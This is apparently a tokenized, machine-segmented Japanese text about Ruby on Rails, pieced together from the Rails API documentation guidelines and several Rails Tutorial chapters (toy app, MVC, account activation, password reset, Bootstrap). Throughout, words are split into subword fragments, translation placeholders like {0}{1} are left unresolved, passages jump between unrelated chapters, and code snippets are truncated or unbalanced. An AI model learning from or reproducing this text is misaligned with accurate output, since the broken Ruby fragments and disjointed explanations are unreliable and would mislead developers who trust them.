▁# ▁ Re t ur n s ▁true ▁if ▁ no ▁ errors ▁are ▁f ound , ▁false ▁ other w is e .
▁# ▁I f ▁the ▁ ar g um ent ▁is ▁false ▁( default ▁is ▁+ nil + ) , ▁the ▁ con text ▁is
▁# ▁ set ▁to ▁< tt > : create </ tt > ▁if ▁< tt > new _ record ?
▁</ tt > ▁is ▁true ,
▁# ▁and ▁to ▁< tt > : update </ tt > ▁if ▁it ▁is ▁ not .
▁# ▁ V al id ation s ▁with ▁ no ▁< tt > : on </ tt > ▁ option ▁ will ▁run ▁ no
▁# ▁ m at ter ▁the ▁ con text .
▁ V al id ation s ▁with ▁# ▁ some ▁< tt > : on </ tt >
▁# ▁ option ▁ will ▁ only ▁run ▁in ▁the ▁ spec ified ▁ con text .
▁def ▁ valid ? (
▁ 説明 の リスト
▁ 項目 ▁( オプション や パラメータ の リスト など ) ▁ と その 説明 は ハ イ フ ン で つ な ぐ こと 。 コ ロ ン は シンボル で 使用される ので 、 ハ イ フ ン の 方が 読み や す く なります 。
▁# ▁* ▁< tt > : allow _ nil </ tt > ▁- ▁S k ip ▁ validation ▁if ▁ attribute ▁is ▁+ nil + .
▁ 説明 文 は 通常の 英語 として 大文字 で 始 め 、 ピ リ オ ド で 終 わ ること 。
▁ 動的 に 生成される メソッド
▁` ( module | class ) _ eval ( 文字列 ) ` メソッドで 作成される メソッド には 、 生成された コードの インスタンス の そ ば に コメント が 置かれます 。
▁この ように 作成された コメント には 、 スペース 2 文字 分 の インデント が与えられ ます 。
▁for ▁ s e ver ity ▁in ▁S e ver ity . const an t s
▁class _ eval ▁< < - E O T , ▁ _ _ F I L E _ _ , ▁ _ _ L IN E _ _
▁def ▁# { s e ver ity . downcase } ( message ▁= ▁nil , ▁ pro g name ▁= ▁nil , ▁ & block ) ▁# ▁def ▁ debug ( message ▁= ▁nil , ▁ pro g name ▁= ▁nil , ▁ & block )
▁ add ( # { s e ver ity } , ▁ message , ▁ pro g name , ▁ & block ) ▁# ▁ add ( D E B U G , ▁ message , ▁ pro g name , ▁ & block )
▁end ▁# ▁end
▁#
▁def ▁# { s e ver ity . downcase } ?
▁# ▁def ▁ debug ?
▁# { s e ver ity } ▁ > = ▁@ le ve l ▁# ▁D E B U G ▁ > = ▁@ le ve l
▁ E O T
▁ 生成された 行 が 多 過 ぎ る ▁( 200 行 を 超 え る ) ▁ 場合 、 コメント を 呼び出し の 上 に 置 い てください 。
▁# ▁def ▁self . find _ by _ login _ and _ activat ed ( * ar g s )
▁# ▁ options ▁= ▁ ar g s . ext r a ct _ options !
▁# ▁ ...
▁self . class _ eval ▁% {
▁def ▁self . # { method _ id } ( * ar g s )
▁ options ▁= ▁ ar g s . ext r a ct _ options !
▁ メソッドの 可 視 性
▁Rails の ドキュメント を作成する に あ たり 、 ユーザー 向け の パ ブ リ ッ ク な API と 内部 API の違い を 理解 しておくこと が 重要です 。
▁ 多くの ライブラリ と同様 、 Rails でも 内部 API の 定義 に private キーワード が使用されます 。
▁しかし 、 パ ブ リ ッ ク な API の ルール は 若 干 異なります 。
▁Rails では 、 すべての public な メソッドが ユーザーに 公開 されて 使用される ということ を 前 提 に していません 。 代りに 、 その メソッドが 内部 API であることを 示す ために `: no doc : ` ディレクティブ を使用します 。
▁つまり 、 Rails では 可 視 性 が ` public ` の メソッド であっても 、 ユーザーに 公開 されている とは 限 らない のです 。
▁` ActiveRecord :: Co re :: Class M e th o d s # ar e l _ table ` を 例 に 説明します 。
▁ module ▁ActiveRecord :: Co re :: Class M e th o d s
▁def ▁are l _ table ▁# : no doc :
▁# ▁ 何か 書く
▁このメソッドは 一 見 して ` ActiveRecord :: Co re ` の パ ブ リ ッ ク な クラス メソッド であり 、 実際 それ 自体 は 間 違 い ではありません 。
▁しかし Rails チ ー ム は この種の メソッド に 依 存 して 欲 しく ない と 考え ています 。
▁その ために `: no doc : ` を指定して 、 ドキュメント に 含 まれ ないように しています 。
▁ 実際の 理由 は 、 Rails チ ー ム は この種の 内部 メソッド の動作 を 必要に応じて リリース ごとに 変更 できるように したい からです 。
▁これらの メソッドは 名前 や 戻り値 が変更され たり 、 クラス 自体 が 消 滅 したり すること も あり え ます 。 従って これらは 外部 に対して 何も 保 証 されて お らず 、 Rails アプリケーション や プラグイン が この種の API に 依 存 すべき ではありません 。
▁これらの API に 依 存 してしまう と 、 Rails を 次の リリース に アップグレード したときに アプリケーション や G e m が 壊 れる 危 険 性 があります 。
▁Rails 貢 献 者 が ドキュメント を作成する 場合 、 その API を 外部 開発者 に 公開 して よい かどうか に 常に 注意 を 払 う 必要があります 。
▁Rails チ ー ム は 、 パ ブ リ ッ ク な API に対して 重 大 な 変更 を行なう 際 は 、 必ず 非推奨 サ イ ク ル を 経 て から 行なう ことに しています 。
▁ 内部 メソッド や 内部 クラスの 可 視 性 が private になって い ない場合は 、`: no doc : ` オプション を指定する ことを 推 奨 します ▁( なお 可 視 性 が private の場合 はデフォルトで 内部 扱 い になります )。
▁API が 安 定 した ら 可 視 性 を変更 できます が 、 後 方 互 換 性 を 保 ち ながら パ ブ リ ッ ク な API を変更する ことは 簡単 ではありません 。
▁ クラス や モジュール に対して `: no doc : ` を 指定 した 場合 、 その 中 の すべての メソッドは 内部 API であり 、 直接 アクセス すること は 許 され ないこと が 示 されます 。
▁ 既存の `: no doc : ` 指定 は む や み に変更 しないでください 。
▁この 指定 を 外 す 際 は 、 必ず コア チ ー ム の 誰 か か コードの 著者 に 相 談 して から に してください 。
▁`: no doc : ` の 追加 は 、 絶 対 に 無 断 で 行 わ ない で ください 。 ドキュメント から その メソッド や クラスの 記述 が 失 わ れ てしまいます 。
▁たとえば 、 ある メソッドの 可 視 性 を private から public に 切り 替 え た 際に 、 内部 の パ ブ リ ッ ク メソッド に `: no doc : ` が 指定 されて い なかった という 事 例 があり え ます 。
▁ そのような ケース を見つけ たら 、 必要に応じて pull ▁ request で 議 論 してください 。 直接 doc rails を変更する ことは く れ ぐ れ も 行 わ ない で ください 。
▁ まとめ : ▁Rails チ ー ム は 可 視 性 が public で 内部で のみ 使用する メソッド や クラス には `: no doc : ` を指定します 。 API の 可 視 性 の 変更 は 慎 重 に 行 な わ れる べ き であり 、 pull ▁ request で の 議 論 を 経 て から 行なう こと 。
▁Rails ス タ ッ ク
▁Rails ▁API の一部 を ドキュメント 化 する 際に は 、 それ が Rails ス タ ッ ク の ひとつ となる ことを 意 識 しておくこと が 重要です 。
▁つまり 、 ドキュメント 化 し よう と している メソッド や クラスの スコープ や コンテキスト に応じて 振る舞い が 変 化 すること がある ということです 。
▁ ス タ ッ ク 全体 を 考 慮 に 入 れ れば 、 振る舞い の 変 化 する は あ ち こ ち に 見つか ります 。 ` ActionView :: Helper s :: Asset T a g Helper # image _ tag ` など が 典 型 です 。
▁# ▁ image _ tag (" i con . png ")
▁# ▁# ▁=> ▁< im g ▁ alt =" I con " ▁src =" / assets / i con . png " ▁/>
▁` # image _ tag ` はデフォルトで は 常に ` / images / i con . png ` を返します が 、 アセットパイプライン など を含む Rails の フル ス タ ッ ク で 見 ると 、 上 のような 結果 が 返される ところ もあります 。
▁ デフォルトの Rails フル ス タ ッ ク を 使用している 場合 、 実際に 経験 する 振る舞い に対して しか 関 心 が 持 て ない ものです 。
▁ このような 場合 、 特定の メソッドの 振る舞い だけ ではなく 、 ▁ _ フレームワーク _ ▁ の 振る舞い も ドキュメント 化 する ように したい と思います 。
▁Rails チ ー ム が 特定の API を どのように 扱 っている か を 知りたい 場合は 、 お 気 軽 に チ ケ ッ ト を 発 行 して [ issue ▁t rack er ]( https :// github . com / rails / rails / issue s ) に パッチ を 送 って ください 。
▁この To y アプリケーション は もちろん 動 きます が 完成 品 ではなく 、 しか も 多くの 手順 が 「 魔 法 」 のように 思える かもしれません 。 {0}{1} 第 3 章 {/1}{/0} 以降 で 作成する サンプルアプリケーション では 同 等 の 機能を 1 つ 1 つ 手動で 作成 します ので 、 ご 安 心 ください 。
▁{0} リスト 2.1 {/0} ▁< n >< n > {1} To y アプリケーション 用の \ ko de { Gemfile }{/1}
▁{0}{1} リスト 2.1 {/1}{/0} の内容 は {2} {1} リスト 1 . 14 {/1} {/2} と同じ です 。
▁{0} 図 ▁ 2.1 ▁{/0}{1} Bitbucket に toy アプリ の リポジトリ を作成する {/1}
▁{0} 図 ▁2 . 2 ▁{/0}{1} ユーザーの データモデル {/1}
▁ 詳 しく は \ ref { sec : database _ migration s } から 解説します が 、\ ko de { {1} 図 2 . 2 {/1} } のユーザー ▁( {3} users {/3} ) ▁ は データベースの テーブル ▁(\ emph { table }) ▁ に相当 します 。 また 、 {3} id {/3} 、 {3} name {/3} 、 {3} email {/3} の 属性 は それぞれ テーブル の カラム ▁(\ emph { column } : ▁ 列 ) ▁ に相当 します 。
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate ) } ▁ 必要があります 。 そのため 、 マイクロポストの 投 稿 者 を 記 録 するための \ ko de { user _ id } も 追加 します 。
▁{0} 図 ▁2 . 3 ▁{/0}{1} マイクロポストの データモデル {/1}
▁\ ref { sec : demo _ user _ has _ many _ microposts } では 、 {2} user _ id {/2} という 属性 を使用して 、 1 人のユーザー に 複数の マイクロポスト が 関連付け られ る という 構造 を 簡潔 に 説明します 。 詳 細 は \ ko de { {1} 第 11 章 {/1} } で 完全に 説明します 。
▁\ ko de { name : string } と \ ko de { email : string } オプション を追加する ことで 、 User モデル の内容 が {1}{2} 図 2 . 2 {/2}{/1} の 表 の とおり になる ようにします
▁その 際 、 {0}{1} 表 2.1 {/1}{/0} に記載されている 、 ページ と URL の関係 を参照 すると わかり やすい と思います 。
▁{0} 表 2.1 : ▁{/0}{1} Users リソース における 、 ページ と URL の関係 {/1} 。
▁まずは ユーザーの 一覧 を表示する \ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を見てみましょう 。 もちろん 、 この時点で はまだ ユーザー は 登録 されていません ▁( {2} {3} 図 2 . 4 {/3} {/2} )。
▁{0} 図 2 . 4 ▁{/0}{1} Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態 {/1}
▁ ユーザーを 新規作成 するには 、\ href { http :// localhost :3000/ users / new }{\ text tt { 図 2 . 5 } } の {2} {3} new {/3} {/2} ページ を表示します
▁{0} 図 2 . 5 ▁{/0}{1} 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }) {/1}
▁ユーザー が作成され 、\ href { http :// localhost :3000/ users /1 }{\ text tt { 図 2 . 6 } } のように {2} {3} show {/3} {/2} ページ が表示されます
▁( 緑色 の ウ ェ ル カ ム メッセージ は 、 { p 0} で 解 説 する {2} flash {/2} という 機能 を使用して 表示 しています )。
▁ここで 、 URL が \ href { http :// localhost :3000/ users /1 }{/ users /1 } と 表示 され ていることに注目してください 。 ご 想 像 の とおり 、 この 数字 \ ko de {1} は {2} {3} 図 2 . 2 {/3} {/2} の \ ko de { id } 属性 その ものです 。
▁{0} 図 2 . 6 ▁{/0}{1} ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 }) {/1}
▁今度は 、 ユーザー情報 を変更 するために \ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ページを 表示 してみましょう ▁( {2} {3} 図 2 . 7 {/3} {/2} )。
▁この 編集 ページ 上で ユーザー に関する 情報を 変更 し 、[ U p date ▁User ] ▁ ボタン を 押 せ ば 、 To y アプリケーション 内の ユーザー情報 が変更され ます ▁( {0}{1} 図 2 . 8 {/1}{/0} )。
▁( 詳 細 は {0}{1} 第 6 章 {/1}{/0} で説明します が 、 この ユーザー情報 は 、 Web アプリケーションの 背 後 にある データベースに保存 されています 。 )
▁{0} 図 2 . 7 {/0} ▁{1} ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) {/1}
▁{0} 図 2 . 8 {/0} ▁{1} 情報 が 更新 された ユーザー {/1}
▁{0} 図 2 .9{/0} ▁{1} 2 人 目 のユーザー が追加され た 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users }) {/1}
▁ユーザーの 作成 、 表示 、 編集 方法 について説明し ました ので 、 今度は ユーザーを削除 してみましょう ▁( {0}{1} 図 2.1 0 {/1}{/0} )。
▁{0}{1} 図 2.1 0 {/1}{/0} の ▁[ D es tr o y ] ▁ リンクをクリックすると ユーザーが 削除 され 、 index ページの ユーザー は 1 人 だけ になります
▁{0} 図 2.1 0 {/0} ▁{1} ユーザーを削除 する {/1}
▁ 具体的には 、\ href { http :// localhost :3000/ users }{/ users } の index ページを ブラウザで 開 く という 典 型 的な 操作 を行う ときに 何 が 起 こ っている か を MVC ▁( {1}{2} 図 2.1 1 {/2}{/1} ) ▁ で説明します 。
▁{0} 図 2.1 1 {/0} ▁{1} Rails における MVC {/1}
▁最初に ブラウザから の リクエスト を見てみましょう 。 この リクエスト は 、 アドレス バー に URL を 入力 したり リンクを クリック した 時に 発生 します ▁( {0}{1} 図 2.1 1 {/1}{/0} の 1 )。
▁ユーザー から リクエスト された URL を Users リソース で使用する コントローラのアクション に 割り当て る ▁( マッピング する ) ▁ コードは 、 {0}{1} リスト 2 . 2 {/1}{/0} のような 感 じ になります 。 このコード は Rails の ルーター 設定 ファイル ▁( config / routes . rb ) ▁ の中で 使用 され 、 URL と アクション の 組み合わせ ▁( {2} {1} 表 2.1 {/1} {/2} ) ▁ を 効率 よく 設定 することができます
▁{0} リスト 2 .2{/0} ▁< n >< n > {1} Rails ルート で使用する Users リソース 用の ルール {2} {/2} ▁ {3} config / routes . rb {/3} {/1}
▁{0} リスト 2 . 3 {/0} ▁< n >< n > {1} ルート から users への ルーティング を追加する {2} {/2} ▁ {3} config / routes . rb {/3} {/1}
▁{0} リスト 2 . 4 {/0} ▁< n >< n > {1} Users コントローラの 骨 格 ▁ {2} {/2} ▁ {3} app / controllers / users _ controller . rb {/3} {/1}
▁end
▁{0}{1} 表 2 . 2 {/1}{/0} の URL には 重複 している もの がある ことにご注目ください 。 たとえば 、\ ko de { show } アクション と ▁\ ko de { update } アクション は 、 どちら も / users /1 という URL に 対応 しています 。
▁{0} 表 7 . 1 {/0} ▁{1} リスト \ ref { code : rails _ routes } の Users リソース が提供する RESTful な ルート {/1}
▁ Users コントローラ と User モデル の関係 を さらに 考 察 するために 、\ ko de { {1} リスト 2 . 5 {/1} } で {2} index {/2} アクション を 整 理 して み ました
▁{0} リスト 2 . 5 {/0} ▁< n >< n > {1} To y アプリケーションの 簡潔 な ユーザー \ ko de { index } アクション {3} {/3} ▁ { 4 } app / controllers / users _ controller . rb {/4} {/1}
▁\ ko de { index } アクションに \ ko de {@ users ▁= ▁User . all } という 行 があります ▁( {1}{2} 図 2.1 1 {/2}{/1} の 3 に相当 )。 これ によって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ ko de {@ users } という 変数 に保存 します ▁( 5 )。 なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と 発 音 します 。
▁User モデル の内容 は {0}{1} リスト 2 . 6 {/1}{/0} に あります 。 驚 く ほど シンプルな 内容 ですが 、 継 承 ▁(\ ref { sec : inheritance _ h i er ar ch ies } および \ ref { sec : ruby _ classes }) ▁ によって 多くの 機能 が 備 わ っています 。
▁ 特に 、\ emph { Active ▁Record } という Ruby ライブラリ の おかげで 、 {1}{2} リスト 2 . 6 {/2}{/1} の User モデル は \ ko de { User . all } という リクエスト に対して 、 D B 上の すべての ユーザー を返す ことができます 。
▁{0} リスト 2 . 6 {/0} ▁< n >< n > {1} To y アプリケーションの User モデル {2} {/2} ▁ {3} app / models / user . rb {/3} {/1}
▁\ ko de {@ users } 変数 に ユーザー 一覧 が 保存 される と 、 コントローラ は \ emph { {2} リスト 2 . 7 {/2} } の {3} ビュー {/3} を呼び出します ▁( 6 )。
▁{0} リスト 2 . 7 {/0} ▁< n >< n > {1} index アクションに 対応 している ビュー {2} {/2} ▁ {3} app / views / users / index . html . erb {/3} {/1}
▁ Users リソース の場合 と同様に 、 Microposts リソース も scaffold で コードを 生成 してみましょう 。 \ ko de { rails ▁ generate ▁ scaffold } コマンド を使用して 、 {1}{2} 図 2 . 3 {/2}{/1} の データモデル を 実装 してみます
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ scaffold で 生成 した 実際の コード には {0}{1} リスト 2 . 8 {/1}{/0} よりも 多くの 改 行 が追加され ている ことがあります 。
▁{0} リスト 2 . 8 {/0} ▁< n >< n > {1} Rails ルート で使用する Microposts リソース 用の ルール {2} {/2} ▁ {3} config / routes . rb {/3} {/1}
▁{0} 表 11 .2{/0} ▁{1} Microposts リソース が提供する リスト \ ref { code : demo _ microposts _ resource } の RESTful ルート {/1}
▁ Microposts コントローラ 自体 の 構造 を {0}{1} リスト 2 . 9 {/1}{/0} に示します 。
▁{0} リスト 2 .9{/0} ▁< n >< n > {1} Microposts コントローラの 骨 格 ▁ {2} {/2} ▁ {3} app / controllers / microposts _ controller . rb {/3} {/1}
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページを ブラウザで 開 き 、 新しいマイクロポスト の 情報を 入力 して マイクロポストを いくつか 作成 してみましょう ▁( {1}{2} 図 2.1 2 {/2}{/1} )。
▁{0} 図 2.1 2 {/0} ▁{1} 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }) {/1}
▁ここでは ひ と まず マイクロポストを 1 つ か 2 つ 作成 し 、 少なくとも 片 方 の \ ko de { user _ id } が \ ko de {1} になる ように して 、\ ref { sec : a _ user _ to ur } で作成した 最初の ユーザーの id と同じ に します 。
▁ 結果 は {0}{1} 図 2.1 3 {/1}{/0} の よう になるはずです 。
▁{0} 図 2.1 3 {/0} ▁{1} マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }) {/1}
▁{0} リスト 2.1 0 {/0} ▁< n >< n > {1} マイクロポストの 最 大文字 数 を 14 0 文字 に 制限 する 。 {2} {/2} ▁ {3} app / models / micropost . rb {/3} {/1}
▁{0}{1} リスト 2.1 0 {/1}{/0} のコードは 、 これ で 本当に 動作する のか と 思える かもしれませんが 、 ち ゃ ん と 動作します ▁( 検証 機能 については \ ref { sec : user _ validations } で さらに 詳 しく 説明します )。 14 1 文字 以上 の 新 規 マイクロポストを 投 稿 して み れば わかり ます 。
▁{0}{1} 図 2.1 4 {/1}{/0} に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示 されます
▁{0} 図 2.1 4 {/0} ▁{1} マイクロポストの 作成 に 失敗した場合 の エラーメッセージ {/1}
▁User モデルと Micropost モデル を それぞれ {0}{1} リスト 2.1 0 {/1}{/0} と {2} {1} リスト 2.1 1 {/1} {/2} のように 更新 することで この 関連付けを 表現 できます 。
▁{0} リスト 2.1 1 {/0} ▁< n >< n > {1} 1 人のユーザー に 複数の マイクロポスト がある 。 {2} {/2} ▁ {3} app / models / user . rb {/3} {/1}
▁{0} リスト 2.1 2 {/0} ▁< n >< n > {1} 1 つの マイクロポスト は 1 人のユーザー に のみ 属 する 。 {2} {/2} ▁ {3} app / models / micropost . rb {/3} {/1}
▁この 関連付けを 図 で 表 した もの が {0}{1} 図 2.1 5 {/1}{/0} です 。
▁\ ko de { microposts } テーブル には \ ko de { user _ id } カラム を作成して あった ので 、 それ によって Rails と Active ▁Record が マイクロポスト と ユーザーを 関連付け る ことができる ようになっています 。
▁{0} F ig ur e ▁ 2.1 5 : ▁{/0}{1} The ▁ association ▁be t w e en ▁ microposts ▁and ▁ users . {/1}
▁{0}{1} 第 11 章 {/1}{/0} と {2} {1} 第 12 章 {/1} {/2} では 、 関連付けられた ユーザー と マイクロポストを 同時に 表示 し 、 Twitter のような マイクロポストの フィード を作成する 予定です 。
▁We ▁ first ▁invo ke ▁the ▁console ▁with ▁\ ko de { rails ▁console } ▁ at ▁the ▁ command ▁ line , ▁and ▁the n ▁ re t ri e ve ▁the ▁ first ▁ user ▁ from ▁the ▁ database ▁ us ing ▁\ ko de { User . first } ▁( put t ing ▁the ▁ re s ul t s ▁in ▁the ▁ variable ▁\ ko de { first _ user })
▁このとき Active ▁Record は 、\ ko de { user _ id } が \ ko de { first _ user } の id ▁( ここでは \ ko de {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁{0}{1} リスト 2.1 3 {/1}{/0} と {2} {1} リスト 2.1 4 {/1} {/2} を 比 較 してみる と 、 User モデルと Micropost モデル は いずれ も \ ko de { ActiveRecord :: Base } という クラス を継承し ています ▁( 継 承 関係 は \ ko de { < } 記 号 で 表現 されています )。 この クラス は 、 ActiveRecord が提供する ベース クラス であり 、 クラス 間 の リレーション は { 4 } {1} 図 2.1 6 {/1} {/4} のようになります 。
▁{0} リスト 2.1 3 {/0} ▁< n >< n > {1} \ ko de { User } クラスにおける継承 {3} {/3} ▁ { 4 } app / models / user . rb {/4} {/1}
▁{0} リスト 2.1 4 {/0} ▁< n >< n > {1} \ ko de { Micropost } クラスにおける継承 ▁ {3} {/3} ▁ { 4 } app / models / micropost . rb {/4} {/1}
▁{0} 図 2.1 6 {/0} ▁{1} User モデルと Micropost モデルの 継 承 階層 {/1}
▁{0}{1} リスト 2.1 5 {/1}{/0} と {2} {1} リスト 2.1 6 {/1} {/2} を 比 較 してみる と 、 Users コントローラ と Microposts コントローラ は いずれ も Application Controller を継承し ています 。
▁{0}{1} リスト 2.1 7 {/1}{/0} を見ると 、\ ko de { Application Controller } 自身 は \ ko de { ActionController :: Base } を継承し ています 。 これは Rails の Action ▁P ack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁これらの クラス 同士 の関係 を {0}{1} 図 2.1 7 {/1}{/0} に示します 。
▁{0} クラス 2.1 5 {/0} ▁< n >< n > {1} \ ko de { Users Controller } クラスにおける継承 {3} {/3} ▁ { 4 } app / controllers / users _ controller . rb {/4} {/1}
▁{0} クラス 2.1 6 {/0} ▁< n >< n > {1} \ ko de { Microposts Controller } クラスにおける継承 {3} {/3} ▁ { 4 } app / controllers / microposts _ controller . rb {/4} {/1}
▁{0} クラス 2.1 7 {/0} ▁< n >< n > {1} \ ko de { Application Controller } クラスにおける継承 ▁ {3} {/3} ▁ { 4 } app / controllers / application _ controller . rb {/4} {/1}
▁{0} F ig ur e ▁ 2.1 7 : ▁{/0}{1} The ▁ inheritance ▁ h i er ar ch y ▁for ▁the ▁ Users ▁and ▁ Microposts ▁ controllers . {/1}
▁Rails の コントローラ は 必ず \ ko de { Application Controller } を継承し ている ので 、 Application コントローラ で定義した ルール は 、 アプリケーションの すべての アクションに 反 映 されます 。
▁リスト \ ref { code : toy _ user _ presence _ v a li cat ions } を 次のように 更新 してください : ▁\ ko de { F I L L _ IN } の 部分を 適切な コード に置き換え 、 User モデル の名前 属性 と メール 属性 が存在する かどうか のバリデーション を 行える ようにします ▁( 図 \ ref { fig : user _ presence _ validations })。
▁この 章では 、 Users リソース 用の REST アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ のうち 、 これまで 未 実装 だ った \ ko de { edit }、\ ko de { update }、\ ko de { index }、\ ko de { destroy } アクション を追加し 、 REST アクション を 完成 させ ます 。
▁まずは ユーザーが 自分の プロファイル を 自分 で 更新 できるようにします 。 ここで 早 速 {0}{1} 第 8 章 {/1}{/0} で 実装 した 認 証 用の コード を使います が 、 これは 認 可 モデル について 説明 する 自 然 な キ ッ カ ケ になります 。
▁ ユーザー情報 を 編集 する パターン は 、 ( {0}{1} 第 7 章 {/1}{/0} ) の 新規ユーザー の作成 と 極めて 似 通 っています 。
▁end
▁ユーザー 編集 ページ に対応する ビュー ▁ を 、 リスト \ ref { code : user _ edit _ view } に示します ▁( この ファイルは 手動で 作成する必要があります )。
▁{0} 第 {1} 9 {/1} 章 {/0} では 、 基本的な Users リソース ▁( 表 \ ref { table : RESTful _ users } の 標準的な REST アクション をすべて 使用 ) ▁ と 、 自 由 道 の 高 い 認 証 ▁( authentication ) ▁ および 認 可 ▁( author i z ation ) ▁ システム を作成し ました 。
▁ 今 の 状態 では 、 新しく アカウント を 登録 した ユーザー は アカウント に対する フル アクセス 権限 を 持 っています ▁( { 0} 第 {1} 7 {/1} 章 {/0} ) ▁ が 、 このままでは い か にも 大 雑 把 です 。
▁ { p 0} の 表 { p 2 } を元に 、 より 一 般 性 の 高 い {3} authenticated ? {/3} メソッド を定義する ことにします 。
▁( これ を行う には リスト { p 0} の {2} authenticated ? {/2} メソッドを 改良 する必要があります )。
▁self を省略した 結果を リスト \ ref { code : add _ activation _ to _ users _ migration } に示します 。
▁ このコード では 、 記憶トークン で 使用 した トークン の メソッド や ダイジェスト の メソッドを スト レ ート に 使い ま わ しています 。 リスト { p 0} の {2} remember {/2} メソッドと 比 べ てみましょう 。
▁この コールバック がある ことで 、 ( リスト { p 0} で ユーザー登録 を 行った ときに ) {2} User . new {/2} で 新しい ユーザーが 定義 される と 、 {2} activation _ token {/2} 属性 や {2} activation _ digest {/2} 属性を 自動的に 得られ ます 。 後 者 の activation _ digest 属性 は 既に データベースの カラム と の 関連付け が でき あ が っている ▁( 図 \ ref { fig : user _ model _ account _ activation }) ▁ ので 、 ユーザーが 保存 される ときに 一 緒 に 自動 保存されます 。
▁ ここ まで でき れば 、 リスト { p 0} で定義した {2} @ user {/2} インスタンス変数 、 edit への 名前付きルート 、 ERB を 組み合わせ て 、 必要な リンク を作成 できます ▁( リスト \ ref { code : account _ activation _ view _ text } と リスト \ ref { code : account _ activation _ view _ html })。
▁ development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次 は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s })。
▁リスト { p 0} で定義した {2} account _ activation {/2} の 引数に は 有効な ▁( = 実 在 する ) ▁ユーザー オブジェクトを 渡す 必要がある ため 、 リスト \ ref { code : generated _ user _ mailer _ preview s } は このままでは 動 き ません 。
▁ここで 、 有効化トークン と メール を それぞれ { 0} params [: id ] {/0} と { 0} params [: email ] {/0} で 参 照 できる ▁( { p 1 }) ▁ ことを 思い 出 してみましょう 。
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ ko de { as sign s } メソッドは 本チュートリアル 初 登 場 です 。 {3} 第 {1} 8 {/1} 章 {/3} の 演習 ▁(\ ref { sec : log _ in _ out _ exercises }) ▁ で 説明したように 、\ ko de { as sign s } メソッドを使用すると 、 対応する アクション 内に ある インスタンス変数 にアクセス できるようになります 。
▁リスト { p 0} の {2} edit {/2} アクション に対応する {2} update {/2} アクション を定義する には 、 4 通 り の場合 分 け に対応する 必要があります : ▁ パスワード再設定 の 期 限 が 切 れ ている 場合 、 更新 に成功した場合 、 更新 が 失敗した場合 ▁( パスワード が正しく ない など ) 、 更新 が 失敗した場合 ▁( 一 見 更新 が 成功 した ように 見え る が パスワード が 2 つ とも 空 欄 ) ▁ です 。
▁\ emph { 期待どおり } の 条件 となります 。 そして 条件 が 満 た される と リスト { p 1 } の {3} password _ reset _ expir ed ? {/3} メソッドが 実行されます
▁リスト \ ref { code : user _ model _ password _ reset _ expir ed } のコード を使用すると 、 リスト { p 2 } の {3} update {/3} アクション が 動作する ようになります 。
▁( 訳 注 : ▁ heroku コマンド のバージョン が 古 い と ここで 失敗する かもしれません 。 その 場合は 、 Heroku ▁ To ol b e lt ▁( ▁ https :// to ol b e lt . heroku . com / ▁ ) ▁ を使って 最 新 版 に 更新 するか 、 次の 古 い 文法 の コマンド を 試 してみてください : ▁$ ▁ heroku ▁ add on s : add ▁ s end g r id : start er ▁ ) ▁[ B R ] < n > [ B R ] < n > アプリケーションで S end G r id ア ド オン を使用する には 、 production 環境 の \ href { https :// en . w ikipedia . org / wiki / S im p le _ Mail _ Transfer _ Pro to c ol } { S M T P } に 情報を 記 入 する必要があります 。
▁\ emph { Rails チュートリアル } の この後 の 章では 、 Twitter のような マイクロポスト 機能 ▁( {1} 第 {2} 11 {/2} 章 {/1} ) ▁ と 、 フォロー 中 の ユーザーの 投 稿 の ステータスフィード 機能 ▁( {3} 第 {2} 12 {/2} 章 {/3} ) ▁ の 基本的な 部分を サイトに 搭 載 する ことにしましょう 。
▁ アクション
▁{0} 図 5 . 1 {/0} ▁{1} サンプルアプリケーションの Home ページのモックアップ {/1}
▁{0}{1} 第 7 章 {/1}{/0} で サイトに ユーザー を追加する ときに 備 え て 、 最初の \ ko de { link _ to } に 仮 の リンク を作成します 。
▁2 番目の \ ko de { link _ to } では 、 引数として 画像 ファイルの パス と 任意の オプション ハッシュ を と る \ ko de { image _ tag } ヘルパー の 能 力 が 示 されています 。 シンボル を使用して 、 この場合は \ ko de { alt } 属性を 設定 しています 。
▁self を省略した 結果を リスト \ ref { code : c url _ rails _ png } に示します 。
▁リスト { p 0} で {2} image _ tag {/2} ヘルパー を 使っている ので 、 Rails は 該当する 画像 ファイルを 、 アセットパイプライン を通して {2} app / assets / images / {/2} ディレクトリ の中から 探 してくれます ▁( アセットパイプライン については \ ref { sec : sass _ and _ the _ asset _ pipeline } で説明します )。
▁\ ko de { image _ tag } の 効果 を 確かめ るために 、 ブラウザから 生成された HTML を見てみましょう
▁最初に 、 リスト { p 0} で 示 している ように Bootstrap を追加しましょう 。 これは 、 {2} bootstrap - sass {/2} ▁gem を使用して Rails アプリケーションに 導入 できます 。
▁( ここでは { p 0} の 途 中 で紹介した {2} to u ch {/2} コマンド を使っています が 、 ファイルが 作成 できる なら ▁[ 新 規 ファイル 作成 ] ▁ や 他の コマンド でも 問題 ありません 。 )
